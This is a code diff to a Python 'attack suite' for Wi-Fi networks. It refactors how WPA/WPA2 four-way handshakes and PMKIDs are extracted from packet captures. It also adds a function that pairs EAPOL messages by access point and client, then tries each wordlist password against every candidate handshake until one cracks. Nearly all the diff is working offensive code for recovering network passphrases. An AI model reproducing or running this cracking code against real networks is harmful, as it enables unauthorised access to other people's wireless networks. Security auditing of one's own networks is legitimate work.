@@ -304,91 +304,66 @@ def zero_mic(eapol_raw):
     else:
         return eapol_raw
 
-def extract_handshake_info(filename):
-    packets = rdpcap(filename)
-    ssid = get_ssid(packets)
-    if not ssid:
-        print(colored("[!] SSID not found! SSID is required.", "red"))
-        sys.exit(2)
+def detect_handshake_messages(eapol_packets):
+    """
+    Given a list of EAPOL packets, group them by BSSID/STA and session, and extract valid pairs for cracking.
+    Returns a list of dictionaries with {anonce, snonce, mic, eapol_raw, ...} for each valid handshake.
+    """
+    sessions = dict()
+    for pkt in eapol_packets:
+        dot11 = pkt.getlayer(Dot11)
+        eapol = pkt.getlayer(EAPOL)
+        eapol_raw = bytes(eapol)
+        src = dot11.addr2
+        dst = dot11.addr1
+        bssid = dot11.addr3
+        ap_mac = bssid
+        client_mac = src if src != bssid else dst
+        key_info = int.from_bytes(eapol_raw[5:7], 'big')
+        nonce = eapol_raw[17:49]
+        mic = eapol_raw[81:97]
+        mic_present = (key_info & (1 << 8)) != 0
+        session_id = (ap_mac, client_mac)
+        if session_id not in sessions:
+            sessions[session_id] = []
+        sessions[session_id].append({
+            "packet": pkt,
+            "ap_mac": ap_mac,
+            "client_mac": client_mac,
+            "key_info": key_info,
+            "mic_present": mic_present,
+            "nonce": nonce,
+            "mic": mic,
+            "eapol_raw": eapol_raw,
+        })
 
-    ap_mac = None
-    client_mac = None
-    anonce = None
-    snonce = None
-    mic = None
-    eapol2or4_raw = None
-    key_descriptor_version = None
-
-    for pkt in packets:
-        if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
-            dot11 = pkt.getlayer(Dot11)
-            eapol = pkt.getlayer(EAPOL)
-            eapol_raw = bytes(eapol)
-            src = dot11.addr2
-            dst = dot11.addr1
-            bssid = dot11.addr3
-
-            if len(eapol_raw) < 95:
-                continue
-
-            key_info = int.from_bytes(eapol_raw[5:7], 'big')
-            mic_present = (key_info & (1 << 8)) != 0
-            ack = (key_info & (1 << 7)) != 0
-            install = (key_info & (1 << 6)) != 0
-            descriptor_version = key_info & 0b111
-
-            nonce = eapol_raw[17:49].hex()
-            mic_val = eapol_raw[81:97].hex()
-
-            # Message 1 of 4-way handshake: ANonce (from AP to Client)
-            if not mic_present and ack and not install and anonce is None:
-                anonce = nonce
-                ap_mac = src
-                client_mac = dst
-
-            # Message 2 or 4: SNonce + MIC (from Client to AP)
-            elif mic_present and snonce is None:
-                snonce = nonce
-                mic = mic_val
-                key_descriptor_version = descriptor_version
-                eapol_clean = zero_mic(eapol_raw)
-                length = int.from_bytes(eapol_clean[2:4], 'big')
-                total_len = 4 + length
-                if total_len <= len(eapol_clean):
-                    eapol_clean = eapol_clean[:total_len]
-                eapol2or4_raw = eapol_clean
-                if not ap_mac:
-                    ap_mac = bssid if bssid != src else dst
-                if not client_mac:
-                    client_mac = src
-
-    if not (anonce and snonce and mic and eapol2or4_raw and ssid and ap_mac and client_mac):
-        print(colored("[!] Failed to extract all required handshake parameters.", "red"))
-        sys.exit(3)
-
-    print(colored("=========================================", "grey", "on_white"))
-    print(colored("  [*] Handshake Extraction  ", "red", attrs=["reverse", "bold"]))
-    print(colored("                       ", "grey", "on_white"))
-    print(colored("=========================================", "grey", "on_white"))
-    print(colored(f"SSID: {ssid}", "cyan"))
-    print(colored(f"AP MAC (BSSID): {ap_mac}", "cyan"))
-    print(colored(f"Client MAC (STA): {client_mac}", "cyan"))
-    print(colored(f"ANonce: {anonce}", "cyan"))
-    print(colored(f"SNonce: {snonce}", "cyan"))
-    print(colored(f"MIC: {mic}", "cyan"))
-    print(colored(f"EAPOL (msg 2 or 4, raw hex, MIC zeroed):", "cyan"))
-    print(binascii.hexlify(eapol2or4_raw).decode())
-    print(colored("\n[+] Extraction complete. Initiating brute-force protocol...", "magenta", attrs=["bold"]))
-    return {
-        "ssid": ssid,
-        "ap_mac": ap_mac,
-        "client_mac": client_mac,
-        "anonce": anonce,
-        "snonce": snonce,
-        "mic": mic,
-        "eapol_raw": eapol2or4_raw,
-        "key_descriptor_version": key_descriptor_version
-    }
+    handshake_candidates = []
+    for sid, pkts in sessions.items():
+        pkts = sorted(pkts, key=lambda x: x["packet"].time)
+        for i in range(len(pkts)):
+            for j in range(i+1, len(pkts)):
+                p1 = pkts[i]
+                p2 = pkts[j]
+                if p1["nonce"] == p2["nonce"]:
+                    continue
+                # Aircrack-ng logic: (msg 2,3) or (msg 3,4) or (msg 2,4)
+                if p1["mic_present"] and p2["mic_present"]:
+                    # Try to pick snonce/anonce packet
+                    snonce_pkt, anonce_pkt = (p1, p2) if p1["key_info"] & (1<<7) == 0 else (p2, p1)
+                    handshake_candidates.append({
+                        "ap_mac": p1["ap_mac"],
+                        "client_mac": p1["client_mac"],
+                        "anonce": anonce_pkt["nonce"].hex(),
+                        "snonce": snonce_pkt["nonce"].hex(),
+                        "mic": snonce_pkt["mic"].hex(),
+                        "eapol_raw": zero_mic(snonce_pkt["eapol_raw"]),
+                        "key_descriptor_version": snonce_pkt["key_info"] & 0b111,
+                    })
+    uniq = {}
+    for h in handshake_candidates:
+        k = (h["anonce"], h["snonce"], h["mic"])
+        uniq[k] = h
+    return list(uniq.values())
 
 def customPRF512(key, A, B):
     blen = 64
@@ -531,11 +506,45 @@ def detect_encryption_type(capture_file):
         return "PMKID"
     return "UNKNOWN"
 
+def auto_extract_and_crack(filename, wordlist_path):
+    packets = rdpcap(filename)
+    ssid = get_ssid(packets)
+    if not ssid:
+        print(colored("[!] SSID not found! SSID is required.", "red"))
+        sys.exit(2)
+    eapol_pkts = [pkt for pkt in packets if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11)]
+    handshakes = detect_handshake_messages(eapol_pkts)
+    print(colored(f"[*] Found {len(handshakes)} handshake candidates in capture.", "yellow"))
+    if not handshakes:
+        print(colored("[!] No valid handshake pairs found.", "red"))
+        sys.exit(3)
+
+    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
+        passwords = [line.strip() for line in f]
+    for idx, hs in enumerate(handshakes, 1):
+        print(colored(f"\n[*] Trying handshake candidate #{idx}", "magenta"))
+        params = dict(hs)
+        params["ssid"] = ssid
+        enc_type = identify_encryption_type(params)
+        for attempt, password in enumerate(passwords, 1):
+            if enc_type == "WPA":
+                result = crack_passphrase_wpa(params, password, debug=False)
+            elif enc_type == "WPA2":
+                result = crack_passphrase_wpa2(params, password, debug=False)
+            else:
+                result = crack_passphrase_wpa2(params, password, debug=False) or crack_passphrase_wpa(params, password, debug=False)
+            if result:
+                print(colored(f"\n[!!!] PASSWORD CRACKED: >>> {password} <<<", "green", attrs=["reverse", "bold"]))
+                return
+            if attempt % 100 == 0:
+                print(colored(f"  ...tried {attempt} passwords so far...", "grey"))
+        print(colored(f"[-] No password found for handshake candidate #{idx}.", "red"))
+    print(colored("\n[-] Password not found in wordlist for any handshake candidate.", "red", attrs=["reverse", "bold"]))
+
 def main():
     print_banner()
     parser = argparse.ArgumentParser(description="amx-z0: Combined WEP/WPA/WPA2-PSK/WPA2-PMKID Attack Suite")
     parser.add_argument("capture", help="Capture file (.pcap, .cap, handshake, or pmkid)")
-    parser.add_argument("-e", "--essid", help="SSID of Target AP (optional, required for PMKID if not in capture)")
     parser.add_argument("-P", "--wordlist", help="Wordlist file to use (required for WPA/WPA2/PMKID)", required=False)
     args = parser.parse_args()
 
@@ -594,7 +603,12 @@ def main():
         if not args.wordlist:
             print(colored("[-] Wordlist (-P) is required for WPA2-PMKID attack.", "red"))
             return
-        ssid = args.essid.encode() if args.essid else None
+        ssid = None
+        packets = rdpcap(args.capture)
+        ssid = get_ssid(packets)
+        if not ssid:
+            print(colored("[-] SSID is required for WPA2-PMKID attack when not found in capture.", "red"))
+            return
         pmkid_list = extract_pmkid(args.capture)
         if not pmkid_list:
             print("No PMKID could be extracted. Exiting...")
@@ -610,9 +624,6 @@ def main():
                 bssid = bytes.fromhex(ap_mac.replace(":", ""))
                 client = bytes.fromhex(sta_mac.replace(":", ""))
                 pmkid = bytes.fromhex(pmkid)
-                if not ssid:
-                    print(colored("[-] SSID (-e) is required for WPA2-PMKID attack when not found in capture.", "red"))
-                    return
                 file.seek(0)
                 while True:
                     pw_list = file.readlines(chunk_size)
@@ -620,7 +631,7 @@ def main():
                         break
                     if stop_event.is_set():
                         break
-                    future = executor.submit(find_pw_chunk, pw_list, ssid, bssid, client, pmkid, stop_event, progress)
+                    future = executor.submit(find_pw_chunk, pw_list, ssid.encode(), bssid, client, pmkid, stop_event, progress)
                     futures.append(future)
                 for future in concurrent.futures.as_completed(futures):
                     pass
@@ -631,28 +642,7 @@ def main():
         if not args.wordlist:
             print(colored("[-] Wordlist (-P) is required for WPA/WPA2 handshake attack.", "red"))
             return
-        params = extract_handshake_info(args.capture)
-        enc_type = identify_encryption_type(params)
-        print(colored(f"\nIdentified Encryption Type: {enc_type}", "magenta", attrs=["bold"]))
-        with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
-            found = False
-            attempt = 0
-            for line in f:
-                password = line.strip()
-                attempt += 1
-                print(colored(f"[*] [{attempt:04d}] Password Probe: {password}", "magenta"))
-                if enc_type == "WPA":
-                    result = crack_passphrase_wpa(params, password)
-                elif enc_type == "WPA2":
-                    result = crack_passphrase_wpa2(params, password)
-                else:
-                    result = crack_passphrase_wpa2(params, password) or crack_passphrase_wpa(params, password)
-                if result:
-                    print(colored(f"\n[!!!] PASSWORD CRACKED: >>> {password} <<<", "green", attrs=["reverse", "bold"]))
-                    found = True
-                    break
-            if not found:
-                print(colored("\n[-] Password not found in wordlist. Operation failed.", "red", attrs=["reverse", "bold"]))
+        auto_extract_and_crack(args.capture, args.wordlist)
     else:
         print(colored("[-] Could not identify network encryption type or unsupported.", "red"))
 
